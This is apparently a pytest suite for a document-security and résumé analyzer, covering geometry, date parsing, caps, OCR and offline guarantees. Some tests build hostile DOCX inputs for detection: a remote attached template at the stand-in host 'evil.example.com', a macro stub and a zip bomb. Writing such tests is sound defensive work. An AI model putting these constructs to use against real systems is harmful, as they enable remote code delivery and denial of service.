"""Document analyzer tests (Phase 2C): frozen on-disk fixtures, clean controls, unit tests for the
geometry conversions, date parsing and contradictions, caps, OCR (mocked), logging and offline guarantees.

The fixtures under tests/fixtures/docs are frozen: MANIFEST.json is hashed in FROZEN.sha256 and every
file's hash is recorded in the manifest. A fixture is never edited to make a detector pass; if one is
wrong it is changed with an entry in MANIFEST["amendments"].
"""

from __future__ import annotations

import hashlib
import importlib.util
import io
import json
import logging
import socket
import zipfile
from datetime import date
from pathlib import Path
from types import SimpleNamespace

import pytest

ROOT = Path(__file__).resolve().parent.parent
DOCS = ROOT / "tests" / "fixtures" / "docs"
MANIFEST = json.loads((DOCS / "MANIFEST.json").read_text())

_spec = importlib.util.spec_from_file_location("doc_eval", ROOT / "scripts" / "doc_eval.py")
doc_eval = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(doc_eval)

from backend import llm  # noqa: E402
from backend.shield import analyze, config, docx_scan, hygiene, resume, structure  # noqa: E402
from backend.shield.analyze import analyze_document  # noqa: E402
from backend.shield.geometry import normalise, outside, page_boxes  # noqa: E402
from backend.shield.lines import display_box  # noqa: E402

TODAY = date(2026, 10, 10)


# --------------------------------------------------------------------------
# frozen fixtures
# --------------------------------------------------------------------------


def test_manifest_is_frozen_and_files_match():
    assert hashlib.sha256((DOCS / "MANIFEST.json").read_bytes()).hexdigest() == (DOCS / "FROZEN.sha256").read_text().split()[0]
    for name, spec in MANIFEST["files"].items():
        assert hashlib.sha256((DOCS / name).read_bytes()).hexdigest() == spec["sha256"], name


@pytest.mark.parametrize("name", sorted(MANIFEST["files"]))
def test_fixture_matches_manifest(name):
    _rep, failures = doc_eval.evaluate(name, MANIFEST["files"][name])
    assert not failures, failures


@pytest.mark.parametrize("name", sorted(MANIFEST["tool_controls"]))
def test_tool_generated_controls_are_clean(name):
    path = DOCS / "controls" / name
    if not path.exists():
        pytest.skip("control not present")
    rep = analyze_document(path, today=TODAY)
    assert rep.status == "clean" and not rep.security_findings and not rep.needs_review


def test_every_clean_control_has_no_serious_finding():
    for name, spec in MANIFEST["files"].items():
        if spec["status"] == "clean" and spec["kind"] in ("control", "kind", "structure"):
            rep = analyze_document(DOCS / name, today=TODAY)
            assert not rep.hidden_fragments and not [f for f in rep.security_findings if f.severity in ("medium", "high")], name


# --------------------------------------------------------------------------
# geometry: coordinate conversion on offset and rotated pages
# --------------------------------------------------------------------------


def _pd(rotation, media, crop=None):
    return SimpleNamespace(boxes=page_boxes(media, crop), rotation=rotation)


@pytest.mark.parametrize("rotation,bbox,expected", [
    (0, (110, 210, 130, 220), (10, 580, 30, 590)),     # media (100,200,700,800): left 10, top = 800-220
    (90, (110, 210, 130, 220), (10, 10, 20, 30)),
    (180, (110, 210, 130, 220), (570, 10, 590, 20)),
    (270, (110, 210, 130, 220), (580, 570, 590, 590)),
])
def test_display_box_handles_offset_origin_and_rotation(rotation, bbox, expected):
    got = display_box(bbox, _pd(rotation, (100, 200, 700, 800)))
    assert tuple(round(v, 6) for v in got) == expected


def test_effective_box_is_cropbox_intersect_mediabox():
    pb = page_boxes((0, 0, 612, 792), (-100, -100, 1000, 1000))  # oversize CropBox
    assert tuple(pb.effective) == (0, 0, 612, 792)
    pb = page_boxes((100, 200, 700, 800), (150, 250, 650, 750))  # shrunk, offset
    assert tuple(pb.effective) == (150, 250, 650, 750)
    assert outside((0, 0, 10, 10), normalise(pb.effective))
    assert not outside((200, 300, 210, 310), normalise(pb.effective))


def test_outside_tolerance_is_one_point():
    box = (0, 0, 100, 100)
    assert not outside((-0.5, 10, 5, 20), box)
    assert outside((-2.0, 10, -1.5, 20), box)


# --------------------------------------------------------------------------
# resume: dates, contradictions, skills, contact
# --------------------------------------------------------------------------


@pytest.mark.parametrize("token,expected", [
    ("Jan 2023", (date(2023, 1, 1), date(2023, 1, 31), "month")),
    ("Sept 2019", (date(2019, 9, 1), date(2019, 9, 30), "month")),
    ("Jun'22", (date(2022, 6, 1), date(2022, 6, 30), "month")),       # dateparser reads this as 22 June of the current year
    ("03/2020", (date(2020, 3, 1), date(2020, 3, 31), "month")),
    ("2021-03", (date(2021, 3, 1), date(2021, 3, 31), "month")),
    ("2021", (date(2021, 1, 1), date(2021, 12, 31), "year")),         # dateparser invents a month for a bare year
    ("Summer 2020", (date(2020, 6, 1), date(2020, 8, 31), "season")),
    ("Present", (TODAY, TODAY, "day")),
])
def test_parse_token(token, expected):
    assert resume.parse_token(token, TODAY) == expected


@pytest.mark.parametrize("token", ["13/2020", "Smarch 2021", "Feb 30 2020", "99", "sometime"])
def test_unparseable_tokens_are_none_not_invented(token):
    assert resume.parse_token(token, TODAY) is None


def _entry(raw, section="EXPERIENCE", context=None):
    s, e = raw.split(" - ")
    return resume._entry(raw, s, e, section, context or f"Engineer {raw}", TODAY)


def test_overlap_of_full_time_roles_is_reported_but_part_time_is_not():
    a, b = _entry("Jan 2019 - Dec 2020"), _entry("Jun 2020 - Mar 2022")
    assert [c.kind for c in resume.contradictions([a, b], "", TODAY)] == ["overlapping_full_time_roles"]
    intern = _entry("Jun 2020 - Mar 2022", context="Intern (part-time) Jun 2020 - Mar 2022")
    assert resume.contradictions([a, intern], "", TODAY) == []


def test_touching_months_do_not_overlap():
    assert resume.contradictions([_entry("Jan 2019 - Dec 2020"), _entry("Jan 2021 - Mar 2022")], "", TODAY) == []


def test_unparseable_range_stays_raw_and_is_not_a_contradiction():
    e = resume._entry("Smarch 2021 - Present", "Smarch 2021", "Present", "EXPERIENCE", "Engineer Smarch 2021 - Present", TODAY)
    assert e.start is None and e.end is None and e.raw == "Smarch 2021 - Present"
    assert resume.contradictions([e], "", TODAY) == []


def test_experience_claim_depends_on_today():
    e = _entry("Jan 2016 - Dec 2016")
    text = "15 years of experience"
    assert [c.kind for c in resume.contradictions([e], text, TODAY)] == ["experience_exceeds_span"]
    assert resume.contradictions([e], text, date(2031, 1, 1)) == []


def test_phone_numbers_need_a_country_code():
    ex = SimpleNamespace(full_text="call 98765 43210 or +1 (415) 555-0132", block=SimpleNamespace(links=[]))
    assert resume.contact_block(ex).phones == ["+14155550132"]


def test_ambiguous_skill_needs_skills_context():
    def ex(section, text):
        sec = SimpleNamespace(heading=section)
        return SimpleNamespace(block=SimpleNamespace(sections=[sec]), units=[SimpleNamespace(kind="paragraph", text=text, section_index=0)])
    assert "Go" not in [s.skill for s in resume.skills_mentioned(ex("Interests", "I like to go hiking and go to market"))]
    assert "Go" in [s.skill for s in resume.skills_mentioned(ex("Skills", "Python, Go, Docker"))]


def test_redact_hides_contact_values():
    assert "@" in resume.redact("jordan.lee@example.com") and "jordan.lee" not in resume.redact("jordan.lee@example.com")
    assert resume.redact("+919876543210") == "***10"


def test_non_resume_gets_confidence_but_no_resume_block():
    rep = analyze_document(DOCS / "report_project.pdf", today=TODAY)
    assert rep.resume is None and rep.document.resume_confidence is not None and rep.document.resume_confidence < 0.7


# --------------------------------------------------------------------------
# hygiene: detect on RAW before ftfy cleans
# --------------------------------------------------------------------------


def test_mojibake_is_flagged_and_repaired():
    text, fixed = hygiene.clean("CafÃ© rÃ©sumÃ©")
    assert fixed and text == "Café résumé"


def test_ligatures_are_normalised_without_a_mojibake_flag():
    text, fixed = hygiene.clean("eﬃcient ﬁle")
    assert text == "efficient file" and not fixed


def test_hidden_unicode_in_docx_is_found_on_raw_text(tmp_path):
    from docx import Document
    d = Document()
    d.add_paragraph("Backend engineer​​​​​​​​​ with Python")
    p = tmp_path / "zw.docx"
    d.save(p)
    rep = analyze_document(p, today=TODAY)
    assert any("zero_width" in r or "zero" in r for f in rep.hidden_fragments for r in f.reasons)
    assert rep.status == "hidden_text_found"


# --------------------------------------------------------------------------
# caps -> partial result, never silent, never clean
# --------------------------------------------------------------------------


def _many_page_pdf(path: Path, n: int) -> Path:
    from reportlab.pdfgen import canvas
    c = canvas.Canvas(str(path))
    for i in range(n):
        c.drawString(72, 700, f"Page {i + 1} of a long synthetic document with some ordinary body text.")
        c.showPage()
    c.save()
    return path


def test_page_cap_gives_partial_result(tmp_path):
    rep = analyze_document(_many_page_pdf(tmp_path / "long.pdf", config.MAX_PAGES + 1), today=TODAY)
    assert rep.document.truncated and rep.document.pages == config.MAX_PAGES and rep.document.pages_total == config.MAX_PAGES + 1
    assert rep.needs_review and rep.status == "suspicious"
    assert any("cap" in r for r in rep.document.truncation_reasons)


def test_byte_cap_examines_nothing_and_says_so(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "MAX_FILE_MB", 0.0001)
    rep = analyze_document(DOCS / "resume_standard.pdf", today=TODAY)
    assert rep.document.truncated and rep.needs_review and rep.status == "suspicious"
    assert rep.structure is None and rep.extraction_quality.chars_total is None


def test_time_cap_gives_partial_result(tmp_path):
    rep = analyze_document(_many_page_pdf(tmp_path / "t.pdf", 30), max_seconds=0.0, today=TODAY)
    assert rep.document.truncated and rep.needs_review and rep.status != "clean"


def test_encrypted_pdf_is_reported_not_crashed(tmp_path):
    from pypdf import PdfReader, PdfWriter
    w = PdfWriter(clone_from=PdfReader(str(DOCS / "resume_standard.pdf")))
    w.encrypt(user_password="secret", owner_password="owner")
    p = tmp_path / "enc.pdf"
    with open(p, "wb") as fh:
        w.write(fh)
    rep = analyze_document(p, today=TODAY)
    assert rep.document.encrypted and rep.needs_review and rep.status == "suspicious"
    assert rep.structure is None and rep.extraction_quality.chars_total is None


def _docx_with(tmp_path, name, members: dict[str, bytes]) -> Path:
    src = DOCS / "docx_clean_resume.docx"
    out = tmp_path / name
    with zipfile.ZipFile(src) as zin, zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
        for i in zin.infolist():
            zout.writestr(i, zin.read(i.filename))
        for k, v in members.items():
            zout.writestr(k, v)
    return out


def test_docx_zip_bomb_is_not_parsed(tmp_path):
    p = _docx_with(tmp_path, "bomb.docx", {"word/media/huge.bin": b"\0" * (config.DOCX_MAX_UNCOMPRESSED_MB * 1_048_576 + 1)})
    rep = analyze_document(p, today=TODAY)
    assert rep.document.truncated and rep.needs_review and rep.status == "suspicious" and rep.structure is None


def test_docx_macro_and_remote_template_are_reported_not_executed(tmp_path):
    rels = (b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            b'Target="https://evil.example.com/t.dotm" TargetMode="External"/></Relationships>')
    p = _docx_with(tmp_path, "macro.docx", {"word/vbaProject.bin": b"\xd0\xcf\x11\xe0", "word/_rels/settings.xml.rels": rels})
    rep = analyze_document(p, today=TODAY)
    kinds = sorted(f.evidence["kind"] for f in rep.security_findings if f.detector == "active_content")
    assert kinds == ["remote_template", "vba_macro"] and rep.status == "suspicious"


# --------------------------------------------------------------------------
# OCR (mocked: tesseract is not installed here) and extraction quality
# --------------------------------------------------------------------------


def test_ocr_is_off_by_default_and_text_fields_are_none():
    rep = analyze_document(DOCS / "kind_image_only.pdf", today=TODAY)
    assert rep.extraction_quality.ocr_required_pages == [1, 2] and rep.structure is None and rep.resume is None
    assert rep.extraction_quality.chars_total is None and rep.extraction_quality.mojibake_fixed is None
    assert any("OCR" in w for w in rep.warnings)


def test_ocr_requested_without_tesseract_warns(monkeypatch):
    monkeypatch.setattr(analyze, "ocr_available", lambda: False)
    rep = analyze_document(DOCS / "kind_image_only.pdf", ocr=True, today=TODAY)
    assert rep.structure is None and any("not installed" in w for w in rep.warnings)


def test_ocr_text_is_added_when_available(monkeypatch):
    monkeypatch.setattr(analyze, "ocr_available", lambda: True)
    monkeypatch.setattr(analyze, "_ocr_pages", lambda path, pages: {p: "Reduced latency by 42% for 50,000 users.\n\nPython and Docker." for p in pages})
    rep = analyze_document(DOCS / "kind_image_only.pdf", ocr=True, today=TODAY)
    assert rep.extraction_quality.ocr_required_pages == []
    assert [c.match for c in rep.structure.numeric_claims][:2] == ["42%", "50,000 users"]
    assert any("OCR" in n for n in rep.structure.notes)


def test_unmapped_text_warns_above_threshold(monkeypatch):
    real = analyze.scan_pdf_detailed

    def patched(*a, **k):
        r = real(*a, **k)
        for pd in r.pages:
            for c in pd.chars:
                c.unmapped = True
        return r
    monkeypatch.setattr(analyze, "scan_pdf_detailed", patched)
    rep = analyze_document(DOCS / "resume_standard.pdf", today=TODAY)
    assert rep.extraction_quality.chars_unmapped_ratio == 1.0 and any("no Unicode mapping" in w for w in rep.warnings)


def test_detector_error_is_recorded_and_never_clean(monkeypatch):
    def boom(reader):
        raise RuntimeError("synthetic failure")
    monkeypatch.setattr(analyze.pdf_security, "detect_embedded", boom)
    rep = analyze_document(DOCS / "resume_standard.pdf", today=TODAY)
    assert rep.needs_review and rep.status == "suspicious"
    assert [e["detector"] for e in rep.detector_errors] == ["embedded_files"]
    assert rep.structure is not None  # the other detectors still ran


# --------------------------------------------------------------------------
# logging and offline guarantees
# --------------------------------------------------------------------------


def test_logs_never_contain_contact_values(caplog):
    caplog.set_level(logging.DEBUG)
    analyze_document(DOCS / "resume_standard.pdf", today=TODAY)
    analyze_document(DOCS / "docx_clean_resume.docx", today=TODAY)
    logged = "\n".join(r.getMessage() for r in caplog.records)
    assert "jordan.lee@example.com" not in logged and "9876543210" not in logged and "98765 43210" not in logged


def test_analyzer_makes_no_network_or_model_calls(monkeypatch):
    def deny(*a, **k):
        raise AssertionError("network access attempted")
    monkeypatch.setattr(socket.socket, "connect", deny)
    monkeypatch.setattr(socket, "getaddrinfo", deny)
    before = llm.MODEL_CALL_LOG.read_bytes() if llm.MODEL_CALL_LOG.exists() else b""
    for name in ("link_launch_gotor.pdf", "active_javascript.pdf", "embedded_file.pdf", "docx_structure.docx", "report_project.pdf"):
        assert not analyze_document(DOCS / name, today=TODAY).detector_errors
    assert (llm.MODEL_CALL_LOG.read_bytes() if llm.MODEL_CALL_LOG.exists() else b"") == before


def test_analysis_is_deterministic():
    a = analyze_document(DOCS / "report_project.pdf", today=TODAY).model_dump_json()
    b = analyze_document(DOCS / "report_project.pdf", today=TODAY).model_dump_json()
    assert a == b
